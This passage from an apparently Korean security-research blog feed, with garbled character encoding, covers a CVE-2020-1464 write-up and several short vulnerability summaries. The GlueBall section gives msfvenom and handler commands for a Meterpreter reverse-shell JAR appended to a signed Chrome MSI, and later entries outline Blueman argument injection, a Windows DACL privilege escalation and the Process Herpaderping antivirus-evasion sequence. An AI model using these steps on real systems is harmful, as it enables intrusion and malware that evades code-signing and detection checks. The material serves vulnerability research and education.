í•˜ì§€ë§Œâ€¦ ë„˜ì–´ê°€ë„ë¡ í•˜ê³  ì·¨ì•½ì ì„ ì´í•´í•˜ëŠ”ë° í•„ìš”í•œ ë°°ê²½ ì§€ì‹ë¶€í„° ì•Œì•„ë³´ë„ë¡ í•©ì‹œë‹¤!</p><h1 id="MSI-Microsoft-Installer"><a href="#MSI-Microsoft-Installer" class="headerlink" title="MSI (Microsoft Installer)"></a>MSI (Microsoft Installer)</h1><p>Windows ì„¤ì¹˜ íŒ¨í‚¤ì§€<br>â†’ Windowsìš© ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„¤ì¹˜ ë° ì—…ë°ì´íŠ¸ë¥¼ ë°°í¬í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img2.png"></p><p>ì˜¤ëŠ˜ì˜ í¬ìƒì–‘(ã…ã…)ì´ ë  ìš°ë¦¬ í¬ë¡¬ ì–´ì„œ ì˜¤ê³ .<br>í¬ë¡¬ë„ MSIë¡œ ë°°í¬ë˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. malicious í•˜ê²Œ ê¾¸ë©°ì¤„ í…Œë‹ˆ ì¡°ê¸ˆë§Œ ê¸°ë‹¤ë¦¬ë¼êµ¬~</p><h1 id="Code-Signing-Certificate-ì½”ë“œ-ì„œëª…-ì¸ì¦ì„œ"><a href="#Code-Signing-Certificate-ì½”ë“œ-ì„œëª…-ì¸ì¦ì„œ" class="headerlink" title="Code Signing Certificate(ì½”ë“œ ì„œëª… ì¸ì¦ì„œ)"></a>Code Signing Certificate(ì½”ë“œ ì„œëª… ì¸ì¦ì„œ)</h1><blockquote><p><strong>Code Signing Certificate</strong><br>MSê°€ ë„ì…í•œ ì‹¤í–‰íŒŒì¼ê³¼ ìŠ¤í¬ë¦½íŠ¸ì˜ ë””ì§€í„¸ ì„œëª… ê³¼ì •ìœ¼ë¡œ, ì´ëŸ¬í•œ ì¸ì¦ì„œëŠ” íŒŒì¼ì´ ì•ˆì „í•œ íŒŒì¼ì„ì„ ì¦ëª…í•´ì¤€ë‹¤. SmartScreen filterëŠ” ì¸ì¦ì„œì— ëŒ€í•œ ìì²´ì ì¸ white list DBë¥¼ ê´€ë¦¬í•´ í•´ë‹¹ ì¸ì¦ì„œê°€ ì•ˆì „í•œì§€ ì•„ë‹Œì§€<br>íŒë‹¨í•œë‹¤. ì¸ì¦ì„œê°€ ì¡´ì¬í•˜ì§€ ì•Šê±°ë‚˜ íŒŒì¼ì´ ë³€ì¡°ë˜ì–´ ì¸ì¦ì„œê°€ ìœ íš¨í•˜ì§€ ì•Šìœ¼ë©´ ì‹¤í–‰í•  ë•Œ ê²½ê³ ë¥¼ ë„ì›Œ<br>ì‚¬ìš©ìì—ê²Œ ì•Œë¦°ë‹¤.</p></blockquote><p><img src="/2020/11/01/l0ch/cve-2020-1464/img3.png"></p><p>ì½”ë“œ ì„œëª… ì¸ì¦ì„œê°€ ë„ì…ë˜ë©´ì„œ, ì¸ì¦ì„œê°€ í™•ì¸ë˜ì§€ ì•Šì€ íŒŒì¼ì˜ ë¬´ë¶„ë³„í•œ ì‹¤í–‰ì´ ì¤„ì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì—¬ê¸°ì„œ ëë‚˜ë©´ ì„­ì„­í•˜ì£ ? ìœ íš¨í•˜ì§€ ì•Šì€ ì¸ì¦ì„œì„ì—ë„ ì¸ì¦ì„œ ê²€ì¦ì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆëŠ”ë° ì´ê²ƒì´ ì˜¤ëŠ˜ ì„¤ëª…í•  GlueBallì…ë‹ˆë‹¤.</p><h1 id="GlueBall-CVE-2020-1464"><a href="#GlueBall-CVE-2020-1464" class="headerlink" title="GlueBall : CVE-2020-1464"></a>GlueBall : CVE-2020-1464</h1><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>ì·¨ì•½ì ì€ MSI íŒŒì¼ì˜ ì¸ì¦ì„œ ê²€ì¦ ê³¼ì •ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. </p><p>MSI íŒŒì¼ì„ ì‹¤í–‰í•˜ë©´ <code>msisip.dll</code>ì˜ <code>MsiSIPVerifyIndirectData()</code> í•¨ìˆ˜ì—ì„œ íŒŒì¼ì˜ ì‹œì‘ ë¶€ë¶„ì´ ìœ íš¨í•œ MSI íŒŒì¼ì¸ì§€ ê²€ì¦í•˜ê³  ì„œëª…ì„ í™•ì¸í•©ë‹ˆë‹¤.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img4.png"></p><p>ê·¸ëŸ°ë° ì´ë•Œ íŒŒì¼ì˜ ì‚¬ì´ì¦ˆë¥¼ ê²€ì¦í•˜ì§€ ì•Šì•„ MSI íŒŒì¼ì˜ ë’¤ì— ì„ì˜ì˜ ë°ì´í„°ê°€ ì¶”ê°€ë˜ì–´ë„ ìœ íš¨í•œ ì¸ì¦ì„œë¼ê³  íŒë‹¨í•˜ê²Œ ë˜ê³ , ê³µê²©ìëŠ” ì´ë¥¼ ì´ìš©í•´ ì¸ì¦ì„œ ê²€ì¦ì„ ìš°íšŒí•˜ê³  malicious íŒŒì¼ì„ ì‹¤í–‰í•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="JAR-Java-Archive"><a href="#JAR-Java-Archive" class="headerlink" title="JAR(Java Archive)"></a>JAR(Java Archive)</h2><p><img src="/2020/11/01/l0ch/cve-2020-1464/img5.webp"></p><p>JARì€ ìë°” í”Œë«í¼ ë°°í¬ë¥¼ ìœ„í•œ íŒ¨í‚¤ì§€ íŒŒì¼ í¬ë§·ì…ë‹ˆë‹¤.<br>íŠ¹ì§•ìœ¼ë¡œëŠ” zip í¬ë§·ìœ¼ë¡œ ë¹Œë“œë˜ì–´ ìë°” ëŸ°íƒ€ì„ì—ì„œ ë¡œë“œë  ë•Œ íŒŒì¼ì˜ ëì—ì„œë¶€í„° ë¡œë“œë©ë‹ˆë‹¤.</p><p>â†’ íŒŒì¼ ì•ì— ì„ì˜ì˜ ë°ì´í„°ê°€ ìˆì–´ë„ ì •ìƒ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ìŠ¬ìŠ¬ ê°ì´ ì˜¬ë½ ë§ë½ í•˜ì£ ??</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ì•ì„œ ë‚˜ì˜¨ ì·¨ì•½ì ê³¼ JAR íŒŒì¼ì˜ íŠ¹ì„±ì„ ì¡°í•©í•˜ë©´..?</p><p><strong>MSI íŒŒì¼ ëì— ì„ì˜ ë°ì´í„°ê°€ ì™€ë„ ìœ íš¨í•œ ì¸ì¦ì„œê°€ ë˜ëŠ” ì·¨ì•½ì  + íŒŒì¼ ì•ì— ì„ì˜ì˜ ë°ì´í„°ê°€ ìˆì–´ë„ ì •ìƒ ì‹¤í–‰ë˜ëŠ” jar</strong></p><p>ì¶•í•˜í•©ë‹ˆë‹¤! ìµìŠ¤í”Œë¡œì‡ ì‹œë‚˜ë¦¬ì˜¤ê°€ ì™„ì„±ë˜ì—ˆìŠµë‹ˆë‹¤!</p><p>ê·¸ë¦¼ìœ¼ë¡œ ì •ë¦¬í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img6.png" alt="ì¶œì²˜:https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/"></p><p>ë§ŒëŠ¥ ë©”íƒ€ìŠ¤í”Œë¡œì‡ìœ¼ë¡œ ë¦¬ë²„ìŠ¤ ì‰˜ malicious íŒŒì¼ì„ ìƒì„±í•´ì„œ ìµìŠ¤ë¥¼ í•´ë³¼ê²Œìš”.</p><p>msfvenomìœ¼ë¡œ ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì—¬ëŠ” jarí¬ë§·ì˜  malicious íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.</p><pre><code class="hljs markdown">msfvenom -p java/meterpreter/revserse<span class="hljs-emphasis">_https LHOST=[HOST IP] -f jar -o [filename].jar</span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img7.png"></p><p>ë¦¬ìŠ¤ë„ˆë„ ë¯¸ë¦¬ ì—´ì–´ë‘ê² ìŠµë‹ˆë‹¤.</p><pre><code class="hljs markdown">handler -p java/meterpreter/reverse<span class="hljs-emphasis">_https -H 0.0.0.0 </span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img8.png"></p><p>ìƒì„±ëœ jar íŒŒì¼ê³¼ í¬ë¡¬ ì„¤ì¹˜ msi íŒŒì¼ì„ í•©ì¹©ë‹ˆë‹¤. ì´ë•Œ ê¼­ msiíŒŒì¼ ë’¤ì— jar íŒŒì¼ì´ ì˜¤ë„ë¡ ìˆœì„œë¥¼ ì§€ì¼œì•¼ í•œë‹¤ëŠ” ì !</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img9.png"></p><p>ì´ì œ ìƒì„±ëœ exploit.jar ì—ì„œ ì¸ì¦ì„œê°€ ìœ íš¨í•œì§€ í™•ì¸í•´ë³´ë©´</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img10.png"></p><p>ìš”ë ‡ê²Œ ìœ íš¨í•œ ì¸ì¦ì„œë¡œ ë‚˜ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ì‹¤í–‰ì„ í•´ë³´ë©´ í”¼í•´ PCì—ì„œëŠ” ì•„ë¬´ ë°˜ì‘ë„ ì—†ì§€ë§Œ, í”„ë¡œì„¸ìŠ¤ì—ì„œëŠ” ìë°”ê°€ ëŒì•„ê°€ê³  ìˆê³ </p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img11.png"></p><p>ìœ„ ì‚¬ì§„ê³¼ ê°™ì´ ë¦¬ë²„ìŠ¤ ì‰˜ì´ ì •ìƒì ìœ¼ë¡œ ë™ì‘í•˜ëŠ” ê±¸ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><h2 id="Patch-diffing"><a href="#Patch-diffing" class="headerlink" title="Patch diffing"></a>Patch diffing</h2><p>MSëŠ” ì´ì— ëŒ€í•œ íŒ¨ì¹˜ë¥¼ ë‚´ë†¨ëŠ”ë°ìš”, ì–´ë–»ê²Œ íŒ¨ì¹˜ë¥¼ í–ˆëŠ”ì§€ íŒ¨ì¹˜ ì´í›„ì˜ msisip.dllë¥¼ êµ¬í•´ ë¹„êµí•´ë³´ê² ìŠµë‹ˆë‹¤.</p><blockquote><p>ğŸ’¡ì£¼ì˜! ê¸€ì“´ì´ì˜ ì‚½ì§ˆì´ ë‹´ê²¨ ìˆìŠµë‹ˆë‹¤.</p></blockquote><p>ì•Šì´ ê·¼ë°.. ì´ê±° ìµìŠ¤í•˜ê³  ê¸€ ì¢€ ì“°ê³  ë””í•‘ í•˜ë ¤ê³  ë³´ë‹ˆê¹Œ ê·¸ìƒˆ ìœˆë„ìš°ê°€ ì—…ë°ì´íŠ¸ë¥¼ í•´ë²„ë ¸ë„¤..?</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img12.jpg"></p><p>ì•„ ** </p><ul><li>ìë™ ì—…ë°ì´íŠ¸ ì•ˆ ë”</li><li>ìŠ¤ëƒ…ìƒ· ì•ˆ ë§Œë“¤ì–´ë†“ìŒ</li></ul><p>â†’ íŒ¨ì¹˜ ì „ì˜ msisip.dll ëª» êµ¬í•¨ â†’ ?????????</p><p>ìœˆë„ìš° ì›ë°ì´ ë¶„ì„í•  ë• ìë™ ì—…ë°ì´íŠ¸ëŠ” ê¼­ ë„ë„ë¡ í•´ìš”â€¦â€¦. ì•„ë‹ˆë©´ ìŠ¤ëƒ…ìƒ·ì´ë¼ë„â€¦</p><p>íŒ¨ì¹˜ ì „ì˜ msisip.dllì„ ì–´ë–»ê²Œ êµ¬í•˜ì§€? ì–´ë–»ê²Œ êµ¬í•˜ê¸´ ì¡°ì§„ ê±°ì§€ ã…‹ã…‹</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img13.png"></p><p>ì—¿ê°™ì€ ìë™ ì—…ë°ì´íŠ¸ ë•ë¶„ì— ë˜ì§ˆ ë»”í–ˆì§€ë§Œ..^^<br>ê²°êµ­ idiothí˜• vmì— íŒ¨ì¹˜ ì „ íŒŒì¼ì´ ìˆì–´ì„œ ê·¸ê±° êµ¬ê±¸í•´ì„œ ë””í•‘ í•´ë²„ë ¸ì§€ìš”. íŒ€ì¥ë‹˜ ìµœê³  ~<br>ë„˜ê²¨ì£¼ëŠ” ëŒ€ì‹  ë¦¬ì œë¡œ ì •ì£¼í–‰ í•˜ë¼ëŠ” í˜‘ë°•ì€ ëª» ë“¤ì€ ê±¸ë¡œ í•˜ê² ìŠµë‹ˆë‹¤; </p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img14.png"></p><p>íšŒìƒ‰ ë…¸ë“œëŠ” ìƒˆë¡œ ì¶”ê°€ëœ ì½”ë“œ, ë…¸ë€ìƒ‰ ë…¸ë“œëŠ” ë³€ê²½ëœ ë…¸ë“œì…ë‹ˆë‹¤.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img15.png"></p><p>íšŒìƒ‰ ë…¸ë“œë¥¼ ë³´ë©´ <code>MsiSIPVerifyIndirectData()</code> í•¨ìˆ˜ì—ì„œ <code>NeedFileSizeVerification()</code> ê³¼ <code>VerifyFileSize()</code> ë¥¼ í˜¸ì¶œí•˜ëŠ” ì½”ë“œê°€ ì¶”ê°€ëœ ê²ƒì„ ë³´ì•„ MSI íŒŒì¼ì˜ ì‚¬ì´ì¦ˆë¥¼ í™•ì¸í•˜ëŠ” ì½”ë“œë¥¼ ì¶”ê°€í•´ ì·¨ì•½ì  íŒ¨ì¹˜ë¥¼ í•œ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì  ë¶„ì„ì´ë‘ ìµìŠ¤ í•˜ëŠ” ê²ƒë³´ë‹¤ ë””í•‘ í•˜ëŠ”ë° ì‹œê°„ì„ í›¨ì”¬ ë§ì´ ì¼ë„¤ìš”â€¦^^ ì´  ê³¼ì •ì„ ê°œì„ í•  ì—¬ì§€ê°€ ìˆì„ ê²ƒ ê°™ì•„ ë‹¤ìŒ ê¸€ì€ ë””í•‘ê³¼ ê´€ë ¨ëœ ì—°êµ¬ ì£¼ì œ ì¼ ê²ƒ ê°™ìŠµë‹ˆë‹¤.  ì´ê±° í•˜ëŠë¼ ìœˆë„ìš° vmë§Œ 5ê°œ ë§Œë“  ê±´ ì•ˆ ë¹„ë°€ ^.^ </p><p>ê·¸ëŸ¼ ë‹¤ìŒ ê¸€ë¡œ ëŒì•„ì˜¬ê²Œìš” ì•ˆë…•!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>msi</tag>
      
      <tag>code signing certificate</tag>
      
      <tag>jar</tag>
      
      <tag>glueball</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15238: Blueman argument injection</title>
    <link href="/2020/10/31/fabu1ous/2020-10-31/"/>
    <url>/2020/10/31/fabu1ous/2020-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.exploit-db.com/exploits/48963">Blueman &lt; 2.1.4 - Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Blueman 2.1.4 ì´ì „ ë²„ì „</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>D-bus(Desktop-bus)ëŠ” IPC í˜¹ì€ RPC ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. D-busì˜ DHCPClient ë©”ì†Œë“œì™€ Blueman ì‚¬ì´ì— arguments sanitizing ê³¼ì •ì´ ì—†ì–´ argument injectionì´ ë°œìƒí•˜ê³ , ì‹œìŠ¤í…œ êµ¬ì„±ì— ë”°ë¼ impactê°€ 2ê°€ì§€ë¡œ ë‚˜ë‰©ë‹ˆë‹¤. </p><pre><code class="hljs routeros">1. isc-dhcp-client ì‚¬ìš© ì‹œ<span class="hljs-built_in">ip </span>ëª…ë ¹ì–´ì— argument injection, ì¸í„°í˜ì´ìŠ¤ë¥¼ ì¢…ë£Œí•˜ëŠ” Dos2. dhcpd package ì‚¬ìš© ì‹œ<span class="hljs-string">&quot;-c/arbitrary_script_path&quot;</span>ì˜µì…˜ì„ ì‚¬ìš©í•´ ì„ì˜ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰</code></pre><p>ëŒ€ë¶€ë¶„ì˜  D-bus ì¸í„°í˜ì´ìŠ¤ëŠ” PolicyKitìœ¼ë¡œ Authenticationì„ ê±°ì¹˜ì§€ë§Œ Blueman 2.0.6 ì´ì „ ë²„ì „ì€ Polkit-1ì´ ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë˜ì–´ìˆì–´, ëª¨ë“  ë¡œì»¬ ìœ ì €ê°€ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html">https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>linux</tag>
      
      <tag>blueman</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-6449: Exploiting a textbook use-after-free in Chrome</title>
    <link href="/2020/10/30/l0ch/10-30_1day1line/"/>
    <url>/2020/10/30/l0ch/10-30_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf">Exploiting a textbook use-after-free in Chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome version: master branch build 79956ba, asan build 80.3987.132 Operating System: Ubuntu 18.04</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-6449ëŠ” Chromeì—ì„œ ì‚¬ìš©í•˜ëŠ” blink ì—”ì§„ì˜ <code>WebAudio</code> ëª¨ë“ˆì—ì„œ ë°œìƒí•˜ëŠ” Use-After-Free ì·¨ì•½ì  ì…ë‹ˆë‹¤. </p><p>ì·¨ì•½ì ì€ <code>DeferredTaskHandler::BreakConnections</code> ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ <code>active_source_handlers_</code>ëŠ” <code>finished_source_handlers_</code> ì˜ ì›ì‹œ í¬ì¸í„°ë¥¼ í™œì„± ìƒíƒœë¡œ ìœ ì§€í•˜ëŠ” ì—­í• ì„ í•˜ë©° ì‚¬ìš©ì´ ì™„ë£Œëœ ì´í›„ì—ëŠ” í• ë‹¹ëœ <code>active_source_handlers_</code> ì™€ <code>finished_source_handlers_</code> ê°€ ê°™ì´ freeë˜ì–´ì•¼ í•©ë‹ˆë‹¤.</p><p>ê·¸ëŸ¬ë‚˜ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì‚­ì œí•˜ì—¬ <code>BaseAudioContext::Uninitialize</code> ê°€ ì‹¤í–‰ëœ ì´í›„ <code>DeferredTaskHandler::ClearHandlersToBeDeleted</code> ë¥¼ í˜¸ì¶œí•˜ë©´ <code>active_source_handlers_</code> ë§Œ freeë˜ê³  <code>finished_source_handlers_</code> ì— freeëœ í¬ì¸í„°ê°€ ë‚¨ê²Œ ë©ë‹ˆë‹¤. ì´í›„ <code>DeferredTaskHandler::BreakConnections</code> ë¥¼ í˜¸ì¶œí•´ UAF ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc">https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2020-040-chrome">https://securitylab.github.com/advisories/GHSL-2020-040-chrome</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>use after free</tag>
      
      <tag>L0ch</tag>
      
      <tag>chrome</tag>
      
      <tag>chromium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16939: Windows Group Policy DACL overwriteë¥¼ ì´ìš©í•œ ê¶Œí•œ ìƒìŠ¹</title>
    <link href="/2020/10/29/idioth/2020-10-29/"/>
    <url>/2020/10/29/idioth/2020-10-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation">CVE-2020-16939: WINDOWS GROUP POLICY DACL OVERWRITE PRIVILEGE ESCALATION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í•´ë‹¹ ì·¨ì•½ì ì€ ê·¸ë£¹ ì •ì±… ì—…ë°ì´íŠ¸ ì‹¤í–‰ ì¤‘ì— ìˆ˜í–‰ë˜ëŠ”  <code>SetSecurityFile</code>ì„ ì•…ìš©í•˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p><code>gpupdate /target:user /force</code> ì‹¤í–‰ ì‹œ <code>SetSecurityFile</code>ëŠ” impersonation ì—†ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤. ê·¸ë£¹ ì •ì±… ì—…ë°ì´íŠ¸ê°€ ì‹¤í–‰ëœ í›„ <code>%programdata%\Microsoft\GroupPolicy\Users\&lt;SID&gt;</code>ì˜ ì†Œìœ ìëŠ” Administratorsê°€ ë˜ê³  User ê·¸ë£¹ì€ ì½ê¸° ë° ì‹¤í–‰ ê¶Œí•œë§Œ ê°–ê²Œ ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ í•˜ìœ„ ë””ë ‰í„°ë¦¬ì¸ <code>\Datastore\0\sysvol</code>ì˜ ì†Œìœ ìëŠ” Userê°€ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ê¶Œí•œì´ ë‚®ë”ë¼ë„ í•´ë‹¹ í´ë”ì˜ ê¶Œí•œì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>sysvol</code> ë””ë ‰í„°ë¦¬ ì•„ë˜ì— ê¶Œí•œì„ ìˆ˜ì •í•  ë””ë ‰í„°ë¦¬ì˜ Junctionì„ ìƒì„±í•œ í›„ ê·¸ë£¹ ì •ì±… ì—…ë°ì´íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. í•´ë‹¹ í´ë”ì™€ í´ë” ë‚´ì˜ íŒŒì¼ë“¤ì€ ëª¨ë‘ DACL Writeì˜ ëŒ€ìƒì´ ë˜ë©°  DACL Write ì¤‘ ì—ëŸ¬ê°€ ë°œìƒí•˜ë©´ ìˆ˜ì •í•œ ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤. ì—ëŸ¬ê°€ ë°œìƒí•˜ê²Œ í•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” DACL Writeê°€ ì™„ë£Œë˜ê¸° ì „ì— <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">oplock</a>ì„ ì‚¬ìš©í•˜ì—¬ juctionì„ ì‚­ì œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>dacl</tag>
      
      <tag>group policy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Process Herpaderping</title>
    <link href="/2020/10/28/fabu1ous/2020-10-28/"/>
    <url>/2020/10/28/fabu1ous/2020-10-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jxy-s.github.io/herpaderping/">Process Herpaderping</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><strong>OS</strong></p><ul><li>Windows 7 Enterprise x86</li><li>windows 10 Pro x64</li><li>Windows 10 Pro Insider Preview x64</li></ul><p><strong>Security Prodct</strong></p><ul><li>Windows Defender AntiMalware Client</li><li>Windows Defender Engine</li><li>Windows Defender Antivirus</li><li>Windows Defender Antispyware</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><code>Herpaderping</code>ì´ë¼ëŠ” Detection Evasion ê¸°ìˆ ì…ë‹ˆë‹¤. ë””ìŠ¤í¬ì— ì¡´ì¬í•˜ëŠ” ì‹¤í–‰íŒŒì¼ì„ Process objectì˜ ìƒì„±ê³¼ Initial Thread ì‚½ì… ê³¼ì • ì‚¬ì´ì—ì„œ ìˆ˜ì •í•˜ëŠ” íƒì§€ ìš°íšŒ ë°©ë²•ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê³ ì íŒŒì¼ì— write ì‘ì—…ì´ ìˆì—ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” <code>on-write scanning</code>ì´ ë„ì…ëìŠµë‹ˆë‹¤. ë¬¸ì œëŠ” ì´ <code>on-write scanning</code>ì´ <code>IRP_MJ_CLEANUP</code>(== file handle close)ì´ ë°œìƒí•˜ê¸° ì „ê¹Œì§€ íŒŒì¼ì˜ ìˆ˜ì • ì—¬ë¶€ë¥¼ ê²€ì‚¬í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ê²ë‹ˆë‹¤. ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì€ ìˆœì„œë¡œ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> CreateFile (File handleì„ ê³„ì† ì—´ì–´ë†“ëŠ”ë‹¤.)<span class="hljs-number">2.</span> NtCreateSectioin<span class="hljs-number">3.</span> NtCreatePrcessex<span class="hljs-number">4.</span> ì‹¤í–‰íŒŒì¼ ìˆ˜ì •<span class="hljs-number">5.</span> NtCreateThreadEx<span class="hljs-number">6.</span> CloseFile (IRP_MJ_ClEANUP)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>detection evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Technical Advisory: Pulse Connect Secure â€“ Arbitrary File Read via Logon Message</title>
    <link href="/2020/10/27/l0ch/10-27_1day1line/"/>
    <url>/2020/10/27/l0ch/10-27_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/">Technical Advisory: Pulse Connect Secure â€“ Arbitrary File Read via Logon Message (CVE-2020-8255)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Pulse Connect Secure</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSL VPN ì„œë¹„ìŠ¤ì¸ Pulse Connect Secureì—ì„œ ë¡œê·¸ì˜¨ ë©”ì‹œì§€ êµ¬ì„± ìš”ì†Œë¥¼ ì•…ìš©í•´ arbitrary file readê°€ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ê´€ë¦¬ìëŠ” ë¡œê·¸ì¸ ì‹œ ì¶œë ¥ë˜ëŠ” ë©”ì‹œì§€ë¥¼ <code>/dana-admin/auth/signinNotf.cgi</code> í˜ì´ì§€ë¥¼ í†µí•´ ì„¤ì •í•  ìˆ˜ ìˆëŠ”ë°, <code>en.txt</code> ë° <code>default.txt</code> íŒŒì¼ë¡œ êµ¬ì„±ëœ zip í˜•ì‹ì˜ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ë©´ í•´ë‹¹ íŒŒì¼ì˜ 